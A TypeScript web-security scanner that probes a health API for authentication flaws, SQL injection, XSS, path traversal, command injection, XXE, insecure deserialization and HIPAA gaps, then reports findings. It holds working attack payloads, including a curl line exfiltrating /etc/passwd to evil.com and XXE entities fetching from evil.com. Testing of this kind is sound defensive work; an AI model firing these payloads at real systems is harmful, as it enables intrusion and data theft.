import axios, { AxiosInstance } from 'axios';
import { createHash } from 'crypto';

interface VulnerabilityReport {
  vulnerability: string;
  endpoint: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  payload?: string;
  details?: string;
  recommendation: string;
}

interface SecurityAuditReport {
  auditDate: string;
  targetUrl: string;
  vulnerabilitiesFound: number;
  criticalCount: number;
  highCount: number;
  mediumCount: number;
  lowCount: number;
  findings: VulnerabilityReport[];
  overallRisk: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'MINIMAL';
}

export class SecurityAuditor {
  private client: AxiosInstance;
  private baseUrl: string;
  private results: VulnerabilityReport[] = [];

  constructor(baseUrl: string) {
    this.baseUrl = baseUrl;
    this.client = axios.create({
      baseURL: baseUrl,
      timeout: 10000,
      validateStatus: () => true // Don't throw on any status
    });
  }

  async runFullAudit(): Promise<SecurityAuditReport> {
    console.log(`Starting security audit for ${this.baseUrl}`);
    
    // Run all security tests
    await this.testAuthentication();
    await this.testSQLInjection();
    await this.testXSS();
    await this.testAuthenticationBypass();
    await this.testCSRF();
    await this.testPathTraversal();
    await this.testCommandInjection();
    await this.testXXE();
    await this.testInsecureDeserialization();
    await this.testHIPAASpecific();
    await this.testCryptography();
    await this.testSessionManagement();
    
    return this.generateReport();
  }

  private async testAuthentication(): Promise<void> {
    console.log('Testing authentication mechanisms...');
    
    // Test for weak password policy
    const weakPasswords = ['password', '12345678', 'qwerty123', 'admin123'];
    
    for (const password of weakPasswords) {
      const response = await this.client.post('/api/auth/register', {
        email: `test${Date.now()}@example.com`,
        password: password,
        name: 'Test User'
      });
      
      if (response.status === 201) {
        this.results.push({
          vulnerability: 'Weak Password Policy',
          endpoint: '/api/auth/register',
          severity: 'HIGH',
          payload: password,
          details: 'System accepts weak passwords',
          recommendation: 'Implement strong password requirements (min 12 chars, mixed case, numbers, symbols)'
        });
        break;
      }
    }
    
    // Test for account enumeration
    const response1 = await this.client.post('/api/auth/login', {
      email: 'nonexistent@example.com',
      password: 'wrongpassword'
    });
    
    const response2 = await this.client.post('/api/auth/login', {
      email: 'admin@savitri.health', // Assuming this exists
      password: 'wrongpassword'
    });
    
    if (response1.data !== response2.data || response1.status !== response2.status) {
      this.results.push({
        vulnerability: 'User Enumeration',
        endpoint: '/api/auth/login',
        severity: 'MEDIUM',
        details: 'Different responses for valid vs invalid usernames',
        recommendation: 'Return generic error messages for authentication failures'
      });
    }
    
    // Test for brute force protection
    const bruteForceAttempts = 10;
    let blocked = false;
    
    for (let i = 0; i < bruteForceAttempts; i++) {
      const response = await this.client.post('/api/auth/login', {
        email: 'test@example.com',
        password: 'wrongpassword' + i
      });
      
      if (response.status === 429 || response.data.includes('locked') || response.data.includes('blocked')) {
        blocked = true;
        break;
      }
    }
    
    if (!blocked) {
      this.results.push({
        vulnerability: 'No Brute Force Protection',
        endpoint: '/api/auth/login',
        severity: 'HIGH',
        details: `No rate limiting after ${bruteForceAttempts} failed attempts`,
        recommendation: 'Implement account lockout after 5 failed attempts'
      });
    }
  }

  private async testSQLInjection(): Promise<void> {
    console.log('Testing for SQL injection vulnerabilities...');
    
    const sqlPayloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "1' UNION SELECT * FROM users--",
      "admin'--",
      "1' OR '1' = '1",
      "' OR 1=1--",
      "\" OR 1=1--",
      "' OR 'a'='a",
      "') OR ('1'='1",
      "'; EXEC xp_cmdshell('dir'); --"
    ];
    
    const endpoints = [
      { url: '/api/auth/login', method: 'POST', field: 'email' },
      { url: '/api/users/search', method: 'GET', field: 'q' },
      { url: '/api/sessions/filter', method: 'GET', field: 'status' }
    ];
    
    for (const endpoint of endpoints) {
      for (const payload of sqlPayloads) {
        let response;
        
        if (endpoint.method === 'POST') {
          const data: any = {};
          data[endpoint.field] = payload;
          response = await this.client.post(endpoint.url, data);
        } else {
          response = await this.client.get(`${endpoint.url}?${endpoint.field}=${encodeURIComponent(payload)}`);
        }
        
        // Check for SQL errors in response
        const errorIndicators = ['SQL', 'syntax error', 'mysql', 'postgres', 'ORA-', 'Microsoft SQL'];
        const responseText = JSON.stringify(response.data);
        
        if (errorIndicators.some(indicator => responseText.toLowerCase().includes(indicator.toLowerCase()))) {
          this.results.push({
            vulnerability: 'SQL Injection',
            endpoint: endpoint.url,
            severity: 'CRITICAL',
            payload: payload,
            details: 'SQL error exposed in response',
            recommendation: 'Use parameterized queries and input validation'
          });
          break;
        }
        
        // Check for successful injection (e.g., bypass authentication)
        if (endpoint.url.includes('login') && response.status === 200 && response.data.token) {
          this.results.push({
            vulnerability: 'SQL Injection - Authentication Bypass',
            endpoint: endpoint.url,
            severity: 'CRITICAL',
            payload: payload,
            details: 'Authentication bypassed with SQL injection',
            recommendation: 'Implement prepared statements for all database queries'
          });
          break;
        }
      }
    }
  }

  private async testXSS(): Promise<void> {
    console.log('Testing for XSS vulnerabilities...');
    
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(`XSS`)">',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onfocus=alert("XSS") autofocus>',
      '<textarea onfocus=alert("XSS") autofocus>',
      '<body onload=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>'
    ];
    
    // Test reflected XSS
    for (const payload of xssPayloads) {
      const response = await this.client.get(`/api/search?q=${encodeURIComponent(payload)}`);
      
      if (response.data && response.data.toString().includes(payload)) {
        this.results.push({
          vulnerability: 'Reflected XSS',
          endpoint: '/api/search',
          severity: 'HIGH',
          payload: payload,
          details: 'User input reflected without sanitization',
          recommendation: 'Encode all user input before output'
        });
        break;
      }
    }
    
    // Test stored XSS (if we have a valid token)
    const token = await this.getTestToken();
    if (token) {
      for (const payload of xssPayloads) {
        const response = await this.client.post('/api/messages', {
          content: payload
        }, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        if (response.status === 201) {
          // Try to retrieve the message
          const getMessage = await this.client.get('/api/messages', {
            headers: { 'Authorization': `Bearer ${token}` }
          });
          
          if (getMessage.data && getMessage.data.toString().includes(payload)) {
            this.results.push({
              vulnerability: 'Stored XSS',
              endpoint: '/api/messages',
              severity: 'CRITICAL',
              payload: payload,
              details: 'Malicious script can be stored and executed',
              recommendation: 'Sanitize all user input before storage and encode on output'
            });
            break;
          }
        }
      }
    }
  }

  private async testAuthenticationBypass(): Promise<void> {
    console.log('Testing for authentication bypass...');
    
    const protectedEndpoints = [
      '/api/users/profile',
      '/api/sessions/history',
      '/api/clinical/notes',
      '/api/admin/users',
      '/api/audit/logs'
    ];
    
    const bypassTechniques = [
      { headers: {} }, // No auth header
      { headers: { 'Authorization': 'Bearer ' } }, // Empty token
      { headers: { 'Authorization': 'Bearer null' } }, // Null token
      { headers: { 'Authorization': 'Bearer undefined' } }, // Undefined token
      { headers: { 'Authorization': 'Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.' } }, // JWT with "none" algorithm
      { headers: { 'X-Forwarded-For': '127.0.0.1' } }, // IP spoofing
      { headers: { 'X-Original-URL': '/api/public' } }, // URL override
    ];
    
    for (const endpoint of protectedEndpoints) {
      for (const technique of bypassTechniques) {
        const response = await this.client.get(endpoint, technique);
        
        if (response.status === 200) {
          this.results.push({
            vulnerability: 'Authentication Bypass',
            endpoint: endpoint,
            severity: 'CRITICAL',
            details: `Endpoint accessible without proper authentication using: ${JSON.stringify(technique)}`,
            recommendation: 'Implement strict authentication checks on all protected endpoints'
          });
          break;
        }
      }
    }
  }

  private async testCSRF(): Promise<void> {
    console.log('Testing for CSRF vulnerabilities...');
    
    const token = await this.getTestToken();
    if (!token) return;
    
    // Test state-changing operations without CSRF token
    const stateChangingEndpoints = [
      { url: '/api/users/profile', method: 'PUT', data: { name: 'CSRF Test' } },
      { url: '/api/settings', method: 'POST', data: { notifications: false } },
      { url: '/api/sessions', method: 'DELETE', data: {} }
    ];
    
    for (const endpoint of stateChangingEndpoints) {
      const response = await this.client({
        method: endpoint.method,
        url: endpoint.url,
        data: endpoint.data,
        headers: {
          'Authorization': `Bearer ${token}`,
          'Origin': 'https://evil.com' // Different origin
        }
      });
      
      if (response.status >= 200 && response.status < 300) {
        this.results.push({
          vulnerability: 'CSRF - Missing Token Validation',
          endpoint: endpoint.url,
          severity: 'HIGH',
          details: 'State-changing operation allowed from different origin',
          recommendation: 'Implement CSRF tokens for all state-changing operations'
        });
      }
    }
  }

  private async testPathTraversal(): Promise<void> {
    console.log('Testing for path traversal vulnerabilities...');
    
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '..%252f..%252f..%252fetc/passwd',
      '..%c0%af..%c0%af..%c0%afetc/passwd',
      '/var/www/../../etc/passwd',
      'C:\\..\\..\\windows\\system32\\config\\sam'
    ];
    
    const endpoints = [
      '/api/files/',
      '/api/documents/',
      '/api/reports/',
      '/api/export/'
    ];
    
    for (const endpoint of endpoints) {
      for (const payload of pathTraversalPayloads) {
        const response = await this.client.get(`${endpoint}${encodeURIComponent(payload)}`);
        
        // Check for signs of successful path traversal
        const indicators = ['root:', 'daemon:', '[boot loader]', 'HKEY_LOCAL_MACHINE'];
        const responseText = response.data.toString();
        
        if (indicators.some(indicator => responseText.includes(indicator))) {
          this.results.push({
            vulnerability: 'Path Traversal',
            endpoint: endpoint,
            severity: 'CRITICAL',
            payload: payload,
            details: 'Able to access files outside of intended directory',
            recommendation: 'Validate and sanitize file paths, use allowlists for file access'
          });
          break;
        }
      }
    }
  }

  private async testCommandInjection(): Promise<void> {
    console.log('Testing for command injection vulnerabilities...');
    
    const commandPayloads = [
      '; ls -la',
      '| whoami',
      '`id`',
      '$(cat /etc/passwd)',
      '; ping -c 1 127.0.0.1',
      '& dir',
      '| net user',
      '; curl http://evil.com/steal?data=$(cat /etc/passwd)'
    ];
    
    const endpoints = [
      { url: '/api/reports/generate', field: 'filename' },
      { url: '/api/backup', field: 'path' },
      { url: '/api/logs/search', field: 'pattern' }
    ];
    
    const token = await this.getTestToken();
    if (!token) return;
    
    for (const endpoint of endpoints) {
      for (const payload of commandPayloads) {
        const response = await this.client.post(endpoint.url, {
          [endpoint.field]: payload
        }, {
          headers: { 'Authorization': `Bearer ${token}` }
        });
        
        // Check for command execution indicators
        const indicators = ['uid=', 'gid=', 'Directory of', 'Volume in drive'];
        const responseText = JSON.stringify(response.data);
        
        if (indicators.some(indicator => responseText.includes(indicator))) {
          this.results.push({
            vulnerability: 'Command Injection',
            endpoint: endpoint.url,
            severity: 'CRITICAL',
            payload: payload,
            details: 'System commands can be executed through user input',
            recommendation: 'Never pass user input directly to system commands, use parameterized commands'
          });
          break;
        }
      }
    }
  }

  private async testXXE(): Promise<void> {
    console.log('Testing for XXE vulnerabilities...');
    
    const xxePayloads = [
      `<?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
       <root>&test;</root>`,
      
      `<?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/xxe">]>
       <root>&test;</root>`,
      
      `<?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE root [
         <!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">
         %remote;
       ]>
       <root>&test;</root>`
    ];
    
    const token = await this.getTestToken();
    if (!token) return;
    
    for (const payload of xxePayloads) {
      const response = await this.client.post('/api/import/xml', payload, {
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/xml'
        }
      });
      
      // Check for XXE indicators
      if (response.data && (
        response.data.toString().includes('root:') ||
        response.data.toString().includes('daemon:') ||
        response.status === 500 && response.data.toString().includes('DTD')
      )) {
        this.results.push({
          vulnerability: 'XML External Entity (XXE)',
          endpoint: '/api/import/xml',
          severity: 'HIGH',
          payload: payload,
          details: 'XML parser processes external entities',
          recommendation: 'Disable external entity processing in XML parser'
        });
        break;
      }
    }
  }

  private async testInsecureDeserialization(): Promise<void> {
    console.log('Testing for insecure deserialization...');
    
    // Test with malicious serialized objects
    const maliciousPayloads = [
      // Java serialized object (base64)
      'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa',
      
      // Python pickle
      Buffer.from('\x80\x03cbuiltins\nexec\nq\x00X\x10\x00\x00\x00import os;os.system("id")q\x01\x85q\x02Rq\x03.').toString('base64'),
      
      // PHP serialized object
      'O:8:"stdClass":1:{s:4:"eval";s:16:"system(\'whoami\');";}',
      
      // .NET serialized object
      'AAEAAAD/////AQAAAAAAAAAMAgAAAFRTeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYQUBAAAAFVN5c3RlbS5XZWIuVUkuT2JqZWN0U3RhdGVGb3JtYXR0ZXIrVHlwZUhhc2h0YWJsZQEAAAARU3lzdGVtLkNvbGxlY3Rpb25zLkhhc2h0YWJsZQcAAAAKTG9hZEZhY3RvcgdWZXJzaW9uCENvbXBhcmVyCEhhc2hTaXplBEtleXMGVmFsdWVzB0VxdWFsaXR5Q29tcGFyZXIAAAgICAgAAAAACwAAAAAAAAAEAAAABAAAAAgAAAAJAgAAAAkDAAAAEAIAAAAAAAAABAAAAAQAAAAACQQAAAAJBQAAAAAAAAAEBAAAAAAAAAA='
    ];
    
    const token = await this.getTestToken();
    if (!token) return;
    
    for (const payload of maliciousPayloads) {
      const response = await this.client.post('/api/data/import', {
        data: payload,
        format: 'serialized'
      }, {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      
      if (response.status === 500 || 
          (response.data && response.data.toString().includes('deserialization'))) {
        this.results.push({
          vulnerability: 'Insecure Deserialization',
          endpoint: '/api/data/import',
          severity: 'CRITICAL',
          details: 'Application deserializes untrusted data',
          recommendation: 'Never deserialize untrusted data, use JSON for data exchange'
        });
        break;
      }
    }
  }

  private async testHIPAASpecific(): Promise<void> {
    console.log('Testing HIPAA-specific security requirements...');
    
    // Test for unencrypted PHI transmission
    const response = await this.client.get('/api/patients/123/records', {
      validateStatus: () => true
    });
    
    if (this.baseUrl.startsWith('http://')) {
      this.results.push({
        vulnerability: 'Unencrypted PHI Transmission',
        endpoint: this.baseUrl,
        severity: 'CRITICAL',
        details: 'PHI transmitted over unencrypted HTTP',
        recommendation: 'Enforce HTTPS for all PHI transmission'
      });
    }
    
    // Test for audit logging
    const token = await this.getTestToken();
    if (token) {
      // Access PHI
      await this.client.get('/api/patients/123/records', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      
      // Check if audit log was created
      const auditResponse = await this.client.get('/api/audit/logs?action=PHI_ACCESS', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      
      if (!auditResponse.data || auditResponse.data.length === 0) {
        this.results.push({
          vulnerability: 'Missing HIPAA Audit Logs',
          endpoint: '/api/patients/*/records',
          severity: 'CRITICAL',
          details: 'PHI access not logged as required by HIPAA',
          recommendation: 'Implement comprehensive audit logging for all PHI access'
        });
      }
    }
    
    // Test for data retention
    const oldDataResponse = await this.client.get('/api/audit/logs?age=7years', {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    
    if (oldDataResponse.status === 404 || 
        (oldDataResponse.data && oldDataResponse.data.length === 0)) {
      this.results.push({
        vulnerability: 'Insufficient Audit Log Retention',
        endpoint: '/api/audit/logs',
        severity: 'HIGH',
        details: 'Audit logs not retained for required 6 years',
        recommendation: 'Implement 6-year retention policy for audit logs'
      });
    }
  }

  private async testCryptography(): Promise<void> {
    console.log('Testing cryptographic implementations...');
    
    // Test for weak algorithms
    const headers = await this.client.head('/');
    
    // Check TLS version
    if (headers.headers['tls-version'] && parseFloat(headers.headers['tls-version']) < 1.2) {
      this.results.push({
        vulnerability: 'Weak TLS Version',
        endpoint: '/',
        severity: 'HIGH',
        details: `TLS version ${headers.headers['tls-version']} in use`,
        recommendation: 'Use TLS 1.2 or higher'
      });
    }
    
    // Check for weak ciphers
    const weakCiphers = ['RC4', 'DES', '3DES', 'MD5'];
    if (headers.headers['cipher-suite']) {
      const cipher = headers.headers['cipher-suite'];
      if (weakCiphers.some(weak => cipher.includes(weak))) {
        this.results.push({
          vulnerability: 'Weak Cipher Suite',
          endpoint: '/',
          severity: 'HIGH',
          details: `Weak cipher suite in use: ${cipher}`,
          recommendation: 'Use strong cipher suites (AES-256-GCM, ChaCha20-Poly1305)'
        });
      }
    }
    
    // Test for predictable tokens
    const tokens: string[] = [];
    for (let i = 0; i < 5; i++) {
      const response = await this.client.post('/api/auth/login', {
        email: 'test@example.com',
        password: 'testpassword'
      });
      if (response.data.token) {
        tokens.push(response.data.token);
      }
    }
    
    // Check for patterns in tokens
    if (tokens.length > 1) {
      const entropy = this.calculateEntropy(tokens);
      if (entropy < 50) { // Arbitrary threshold
        this.results.push({
          vulnerability: 'Weak Token Generation',
          endpoint: '/api/auth/login',
          severity: 'HIGH',
          details: 'Tokens appear to have low entropy',
          recommendation: 'Use cryptographically secure random number generation'
        });
      }
    }
  }

  private async testSessionManagement(): Promise<void> {
    console.log('Testing session management...');
    
    const token = await this.getTestToken();
    if (!token) return;
    
    // Test session fixation
    const fixedSessionId = 'fixed-session-id-12345';
    const response = await this.client.post('/api/auth/login', {
      email: 'test@example.com',
      password: 'testpassword'
    }, {
      headers: { 'Cookie': `sessionid=${fixedSessionId}` }
    });
    
    if (response.headers['set-cookie'] && 
        response.headers['set-cookie'].toString().includes(fixedSessionId)) {
      this.results.push({
        vulnerability: 'Session Fixation',
        endpoint: '/api/auth/login',
        severity: 'HIGH',
        details: 'Session ID not regenerated after login',
        recommendation: 'Regenerate session ID upon authentication'
      });
    }
    
    // Test concurrent sessions
    const sessions: string[] = [];
    for (let i = 0; i < 5; i++) {
      const loginResponse = await this.client.post('/api/auth/login', {
        email: 'test@example.com',
        password: 'testpassword'
      });
      if (loginResponse.data.token) {
        sessions.push(loginResponse.data.token);
      }
    }
    
    // Check if all sessions are still valid
    let validSessions = 0;
    for (const sessionToken of sessions) {
      const checkResponse = await this.client.get('/api/users/profile', {
        headers: { 'Authorization': `Bearer ${sessionToken}` }
      });
      if (checkResponse.status === 200) {
        validSessions++;
      }
    }
    
    if (validSessions === sessions.length) {
      this.results.push({
        vulnerability: 'Unlimited Concurrent Sessions',
        endpoint: '/api/auth/login',
        severity: 'MEDIUM',
        details: 'No limit on concurrent sessions per user',
        recommendation: 'Implement session limits per user'
      });
    }
    
    // Test session timeout
    setTimeout(async () => {
      const timeoutResponse = await this.client.get('/api/users/profile', {
        headers: { 'Authorization': `Bearer ${token}` }
      });
      
      if (timeoutResponse.status === 200) {
        this.results.push({
          vulnerability: 'Long Session Timeout',
          endpoint: '/api/auth/*',
          severity: 'MEDIUM',
          details: 'Sessions remain valid for extended periods',
          recommendation: 'Implement 15-minute inactivity timeout for HIPAA compliance'
        });
      }
    }, 16 * 60 * 1000); // Check after 16 minutes
  }

  private async getTestToken(): Promise<string | null> {
    try {
      const response = await this.client.post('/api/auth/login', {
        email: 'test@example.com',
        password: 'testpassword'
      });
      return response.data.token || null;
    } catch (error) {
      return null;
    }
  }

  private calculateEntropy(tokens: string[]): number {
    // Simple entropy calculation based on character frequency
    const combined = tokens.join('');
    const frequency: { [key: string]: number } = {};
    
    for (const char of combined) {
      frequency[char] = (frequency[char] || 0) + 1;
    }
    
    let entropy = 0;
    const total = combined.length;
    
    for (const count of Object.values(frequency)) {
      const probability = count / total;
      entropy -= probability * Math.log2(probability);
    }
    
    return entropy * combined.length / tokens.length;
  }

  private generateReport(): SecurityAuditReport {
    const criticalCount = this.results.filter(r => r.severity === 'CRITICAL').length;
    const highCount = this.results.filter(r => r.severity === 'HIGH').length;
    const mediumCount = this.results.filter(r => r.severity === 'MEDIUM').length;
    const lowCount = this.results.filter(r => r.severity === 'LOW').length;
    
    let overallRisk: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'MINIMAL';
    if (criticalCount > 0) overallRisk = 'CRITICAL';
    else if (highCount > 0) overallRisk = 'HIGH';
    else if (mediumCount > 0) overallRisk = 'MEDIUM';
    else if (lowCount > 0) overallRisk = 'LOW';
    else overallRisk = 'MINIMAL';
    
    return {
      auditDate: new Date().toISOString(),
      targetUrl: this.baseUrl,
      vulnerabilitiesFound: this.results.length,
      criticalCount,
      highCount,
      mediumCount,
      lowCount,
      findings: this.results,
      overallRisk
    };
  }
}

// Export function to run the audit
export async function runSecurityAudit(targetUrl: string): Promise<SecurityAuditReport> {
  const auditor = new SecurityAuditor(targetUrl);
  return await auditor.runFullAudit();
}
